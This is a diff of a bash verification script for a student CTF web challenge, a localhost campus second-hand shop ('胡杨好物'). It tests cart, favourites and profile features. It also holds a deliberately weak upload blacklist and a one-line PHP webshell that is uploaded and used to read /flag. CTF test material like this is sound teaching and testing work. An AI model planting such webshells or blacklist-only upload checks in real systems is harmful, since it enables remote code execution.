@@ -1,6 +1,6 @@
 #!/bin/bash
 # ============================================================
-# CTF 大作业自动化验证脚本
+# 胡杨好物 CTF 大作业自动化验证脚本
 # 运行环境：Git Bash (Windows) / Linux 通用
 # 用法：bash scripts/verify.sh
 # 输出：reports/verify.log
@@ -28,6 +28,8 @@ fi
 BASE="http://127.0.0.1:26112"
 FLAG="flag{this_is_zhangchangxin's_bigwork}"
 HINT="TODO(dev): avatar upload legacy validation only blocks exe/bat/sh/cmd; php/png/jpg are not filtered and original filename is kept under /uploads/."
+BRAND="胡杨好物"
+AUTHOR="张昌鑫"
 LOG="reports/verify.log"
 TMP=".verify_tmp"
 
@@ -80,11 +82,18 @@ done
 if [ "$UP" = "1" ]; then ok "服务已启动并可访问 (http://127.0.0.1:26112)"; else no "服务启动超时，首页不可访问"; fi
 
 # ============================================================
-sec "步骤 3：首页检查（可访问 / hint / 无 flag 泄露）"
+sec "步骤 3：首页检查（品牌 / 作者 / 商品 / hint / 无 flag 泄露）"
 CODE=$(curl -s --max-time 10 -o "$TMP/index.html" -w '%{http_code}' "$BASE/")
 if [ "$CODE" = "200" ]; then ok "首页可访问 (HTTP 200)"; else no "首页访问异常 (HTTP $CODE)"; fi
 expect_contains "主页源码包含上传漏洞 hint 注释" "$TMP/index.html" "$HINT"
-expect_contains "主页为校园二手交易平台页面" "$TMP/index.html" "青苗"
+expect_contains "网站品牌已更名为「胡杨好物」" "$TMP/index.html" "$BRAND"
+expect_contains "页脚版权包含「作者：张昌鑫」" "$TMP/index.html" "作者：$AUTHOR"
+GOODS_COUNT=$(grep -c 'class="goods-card"' "$TMP/index.html" 2>/dev/null || echo 0)
+if [ "${GOODS_COUNT:-0}" -ge 12 ]; then
+    ok "商品列表已扩充（当前 $GOODS_COUNT 件 ≥ 12 件）"
+else
+    no "商品列表数量不足（当前 ${GOODS_COUNT:-0} 件 < 12 件）"
+fi
 expect_not_contains "主页源码不包含真实 flag" "$TMP/index.html" "$FLAG"
 
 # ============================================================
@@ -110,7 +119,59 @@ if [ "$CODE" = "302" ]; then ok "未登录访问个人中心被拦截（302 跳�
 expect_not_contains "个人中心源码不包含真实 flag" "$TMP/dashboard.html" "$FLAG"
 
 # ============================================================
-sec "步骤 5：上传防护检查（.exe 必须被黑名单拦截）"
+sec "步骤 5：购物车功能检查（加购 / 数量增减 / 删除 / 合计）"
+CODE=$(curl -s --max-time 10 -b "$TMP/cookies.txt" -o /dev/null -w '%{http_code}' -d "action=add&id=3" "$BASE/cart.php")
+if [ "$CODE" = "302" ]; then ok "商品 #3 加入购物车成功（302 PRG 跳转）"; else no "商品 #3 加购失败 (HTTP $CODE)"; fi
+
+curl -s --max-time 10 -b "$TMP/cookies.txt" -o "$TMP/cart.html" "$BASE/cart.php"
+expect_contains "购物车页显示已加购商品（宿舍护眼小台灯）" "$TMP/cart.html" "宿舍护眼小台灯"
+expect_contains "购物车页显示小计 ¥ 15.00" "$TMP/cart.html" "¥ 15.00"
+
+curl -s --max-time 10 -b "$TMP/cookies.txt" -o /dev/null -d "action=inc&id=3" "$BASE/cart.php"
+curl -s --max-time 10 -b "$TMP/cookies.txt" -o "$TMP/cart2.html" "$BASE/cart.php"
+expect_contains "数量 +1 后显示 2 件、合计更新为 ¥ 30.00" "$TMP/cart2.html" "¥ 30.00"
+
+curl -s --max-time 10 -b "$TMP/cookies.txt" -o /dev/null -d "action=remove&id=3" "$BASE/cart.php"
+curl -s --max-time 10 -b "$TMP/cookies.txt" -o "$TMP/cart3.html" "$BASE/cart.php"
+expect_contains "删除后购物车为空（空态提示）" "$TMP/cart3.html" "购物车空空如也"
+
+# ============================================================
+sec "步骤 6：收藏功能检查（收藏 / 取消收藏）"
+curl -s --max-time 10 -b "$TMP/cookies.txt" -o /dev/null -d "id=7&return=favorites" "$BASE/favorites.php"
+curl -s --max-time 10 -b "$TMP/cookies.txt" -o "$TMP/fav.html" "$BASE/favorites.php"
+expect_contains "收藏商品 #7 后收藏页可见（考研英语真题全集）" "$TMP/fav.html" "考研英语真题全集"
+
+curl -s --max-time 10 -b "$TMP/cookies.txt" -o /dev/null -d "id=7&return=favorites" "$BASE/favorites.php"
+curl -s --max-time 10 -b "$TMP/cookies.txt" -o "$TMP/fav2.html" "$BASE/favorites.php"
+expect_contains "取消收藏后收藏页恢复空态" "$TMP/fav2.html" "还没有收藏任何好物"
+
+# ============================================================
+sec "步骤 7：个人资料修改功能检查（用户名/性别/年龄/生日/地址）"
+# 使用显式 UTF-8 百分号编码 POST 体，规避 Windows curl 本地代码页（GBK）编码差异
+# username=胡杨测试君 gender=女 address=金柳苑 6 号楼 666
+PENC="username=%E8%83%A1%E6%9D%A8%E6%B5%8B%E8%AF%95%E5%90%9B&gender=%E5%A5%B3&age=23&birthday=2002-05-20&address=%E9%87%91%E6%9F%85%E8%8B%91%206%20%E5%8F%B7%E6%A5%BC%20666"
+CODE=$(curl -s --max-time 10 -b "$TMP/cookies.txt" --data-raw "$PENC" -o /dev/null -w '%{http_code}' "$BASE/profile.php")
+if [ "$CODE" = "302" ]; then ok "资料修改 POST 成功（302 PRG 跳转 profile.php?saved=1）"; else no "资料修改 POST 失败 (HTTP $CODE)"; fi
+
+curl -s --max-time 10 -b "$TMP/cookies.txt" -o "$TMP/profile.html" "$BASE/profile.php"
+expect_contains "新用户名「胡杨测试君」已回显" "$TMP/profile.html" "胡杨测试君"
+curl -s --max-time 10 -b "$TMP/cookies.txt" -o "$TMP/dash2.html" "$BASE/dashboard.php"
+expect_contains "新昵称同步显示在个人中心" "$TMP/dash2.html" "胡杨测试君"
+
+# 非法年龄校验（gender=女）
+PENC_BAD="username=%E8%83%A1%E6%9D%A8%E6%B5%8B%E8%AF%95%E5%90%9B&gender=%E5%A5%B3&age=999&birthday=2002-05-20&address=%E9%87%91%E6%9F%85%E8%8B%91%206%20%E5%8F%B7%E6%A5%BC%20666"
+curl -s --max-time 10 -b "$TMP/cookies.txt" --data-raw "$PENC_BAD" -o "$TMP/profile_bad.html" "$BASE/profile.php"
+expect_contains "非法年龄(999)被服务端校验拦截" "$TMP/profile_bad.html" "年龄需为 1-120 的数字"
+
+# 恢复默认资料，避免污染演示状态
+# username=大漠胡杨 gender=男 address=胡杨大学金柳苑 6 号楼 520
+RENC="username=%E5%A4%A7%E6%BC%A0%E8%83%A1%E6%9D%A8&gender=%E7%94%B7&age=21&birthday=2004-09-01&address=%E8%83%A1%E6%9D%A8%E5%A4%A7%E5%AD%A6%E9%87%91%E6%9F%85%E8%8B%91%206%20%E5%8F%B7%E6%A5%BC%20520"
+curl -s --max-time 10 -b "$TMP/cookies.txt" --data-raw "$RENC" -o /dev/null "$BASE/profile.php"
+curl -s --max-time 10 -b "$TMP/cookies.txt" -o "$TMP/profile_restore.html" "$BASE/profile.php"
+expect_contains "资料已恢复默认值（大漠胡杨）" "$TMP/profile_restore.html" "大漠胡杨"
+
+# ============================================================
+sec "步骤 8：上传防护检查（.exe 必须被黑名单拦截）"
 printf 'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xFF\xFF\x00\x00fake-exe-content' > "$TMP/avatar.exe"
 curl -s --max-time 10 -b "$TMP/cookies.txt" \
     -F "avatar=@$TMP/avatar.exe;type=image/png" \
@@ -120,7 +181,7 @@ curl -s --max-time 10 -o "$TMP/exe_fetch.txt" "$BASE/uploads/avatar.exe"
 expect_not_contains "avatar.exe 未被保存到 /uploads/" "$TMP/exe_fetch.txt" "fake-exe-content"
 
 # ============================================================
-sec "步骤 6：上传绕过 + 一句话木马 GetFlag（核心漏洞验证）"
+sec "步骤 9：上传绕过 + 一句话木马 GetFlag（核心漏洞验证）"
 cat > "$TMP/shell.php" <<'PHPEOF'
 <?php @system($_GET['cmd']);
 PHPEOF
@@ -134,7 +195,7 @@ curl -s --max-time 10 -o "$TMP/flag_resp.txt" "$BASE/uploads/shell.php?cmd=cat%2
 expect_contains "一句话木马执行 cat /flag 返回正确 flag" "$TMP/flag_resp.txt" "$FLAG"
 
 # ============================================================
-sec "步骤 7：Flag 提交校验页面（hash_equals 服务端比对）"
+sec "步骤 10：Flag 提交校验页面（hash_equals 服务端比对）"
 curl -s --max-time 10 -b "$TMP/cookies.txt" --data-urlencode "flag=flag{this_is_a_wrong_flag}" \
     -o "$TMP/flag_bad.html" "$BASE/flag_submit.php"
 expect_contains "错误 flag 提交被拒绝" "$TMP/flag_bad.html" "不正确"
@@ -145,13 +206,11 @@ expect_contains "正确 flag 提交校验成功" "$TMP/flag_ok.html" "恭喜你�
 expect_not_contains "flag_submit 页面源码不包含真实 flag" "$TMP/flag_ok.html" "$FLAG"
 
 # ============================================================
-sec "步骤 8：全站源码 flag 泄露检查"
-for p in "/" "/login.php" "/flag_submit.php"; do
-    curl -s --max-time 10 -o "$TMP/leak.html" "$BASE$p"
+sec "步骤 11：全站源码 flag 泄露检查"
+for p in "/" "/login.php" "/cart.php" "/favorites.php" "/profile.php" "/flag_submit.php"; do
+    curl -s --max-time 10 -b "$TMP/cookies.txt" -o "$TMP/leak.html" "$BASE$p"
     expect_not_contains "源码泄露检查 $p 不含真实 flag" "$TMP/leak.html" "$FLAG"
 done
-LEAK=$(curl -s --max-time 10 -b "$TMP/cookies.txt" "$BASE/dashboard.php" | grep -cF "$FLAG" || true)
-if [ "${LEAK:-0}" = "0" ]; then ok "源码泄露检查 /dashboard.php 不含真实 flag"; else no "源码泄露检查 /dashboard.php 含真实 flag"; fi
 # /flag 文件在容器内且不在 Web 根目录
 if "$COMPOSE" exec -T web sh -c 'test -f /flag && test ! -f /var/www/html/flag && echo FLAG_OK' >> "$LOG" 2>&1; then
     ok "/flag 位于容器根目录且不在 Web 根目录内"
@@ -160,7 +219,7 @@ else
 fi
 
 # ============================================================
-sec "步骤 9：本机 IP 访问 26112 端口检查"
+sec "步骤 12：本机 IP 访问 26112 端口检查"
 IPS=""
 if command -v powershell.exe >/dev/null 2>&1; then
     IPS=$(powershell.exe -NoProfile -Command "Get-NetIPAddress -AddressFamily IPv4 | Select-Object -ExpandProperty IPAddress" 2>/dev/null | tr -d '\r' | grep -v '^127\.' | sort -u)
@@ -178,7 +237,7 @@ done
 if [ -n "$IP_OK" ]; then ok "本机 IP ($IP_OK) 访问 26112 端口成功"; else no "所有本机 IP 均无法访问 26112 端口"; fi
 
 # ============================================================
-sec "步骤 10：最终服务状态"
+sec "步骤 13：最终服务状态"
 "$COMPOSE" ps >> "$LOG" 2>&1
 
 # 清理临时目录
